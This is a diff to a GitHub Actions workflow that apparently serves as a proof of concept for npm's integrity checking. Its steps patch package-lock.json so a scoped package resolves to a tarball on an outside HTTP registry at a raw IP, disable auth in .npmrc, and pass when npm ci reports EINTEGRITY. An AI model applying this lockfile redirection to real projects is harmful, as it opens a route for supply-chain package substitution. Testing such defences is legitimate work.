@@ -1,13 +1,71 @@
-name: Package Integrity PoC
+name: Package Integrity PoC (EINTEGRITY repro)
 on: [push]
+
 jobs:
-  build:
+  repro:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
+      - name: Checkout
+        uses: actions/checkout@v3
+
       - name: Setup Node.js
         uses: actions/setup-node@v3
         with:
           node-version: '18'
-      - name: Attempt to install packages
-        run: npm ci
+
+      - name: Install jq & show Node version
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y jq
+          node -v
+          npm -v
+
+      - name: Verify Verdaccio metadata & tarball path
+        run: |
+          REG="http://34.227.190.3:4873"
+          PKG="@aiyana-dev%2flegit-package"
+          echo "Fetching metadata..."
+          curl -s "${REG}/${PKG}" | jq . > verdaccio-meta.json
+          echo "dist.tarball from meta:"
+          curl -s "${REG}/${PKG}" | jq -r '.versions["1.0.0"].dist.tarball'
+          # Validate exact tarball URL is reachable
+          TB=$(curl -s "${REG}/${PKG}" | jq -r '.versions["1.0.0"].dist.tarball')
+          echo "Checking tarball HEAD: $TB"
+          curl -I --fail "$TB" || (echo "Tarball unreachable (404/timeout) — cannot proceed"; exit 2)
+
+      - name: Show current package-lock.json snippet for package (debug)
+        run: |
+          echo "package-lock exists?"; test -f package-lock.json && echo "yes" || (echo "package-lock.json missing; create one by running npm install locally to capture legit integrity"; exit 3)
+          # Show the current entry (if any)
+          jq '.packages // .dependencies' package-lock.json | sed -n '1,200p' || true
+
+      - name: Patch package-lock.json to point resolved to Verdaccio tarball
+        run: |
+          # The exact Verdaccio tarball URL you confirmed previously:
+          TB="http://34.227.190.3:4873/@aiyana-dev/legit-package/-/legit-package-1.0.0.tgz"
+          # Run the patch script (ensure patch-lock.js exists in repo root)
+          node patch-lock.js "@aiyana-dev/legit-package" "1.0.0" "$TB"
+          echo "Patched lockfile. Show patched section:"
+          jq '.packages // .dependencies' package-lock.json | sed -n '1,200p' || true
+
+      - name: Make sure npm won't attempt auth for scope (optional)
+        run: |
+          # Force no auth for the scope so resolved absolute URLs are fetched without auth prompts.
+          echo "@aiyana-dev:registry=http://registry.npmjs.org/" > .npmrc
+          echo "always-auth=false" >> .npmrc
+          cat .npmrc
+
+      - name: Attempt installation (this should emit EINTEGRITY if tarball differs)
+        run: |
+          set -o pipefail
+          npm ci --verbose 2>&1 | tee npm-ci.log || true
+          echo "Last 200 lines of npm-ci.log:"
+          tail -n 200 npm-ci.log || true
+          # Inspect log for EINTEGRITY
+          if grep -q "EINTEGRITY" npm-ci.log; then
+            echo "EINTEGRITY reproduced — success."
+            exit 0
+          else
+            echo "EINTEGRITY not found in logs. See npm-ci.log for details."
+            exit 1
+          fi
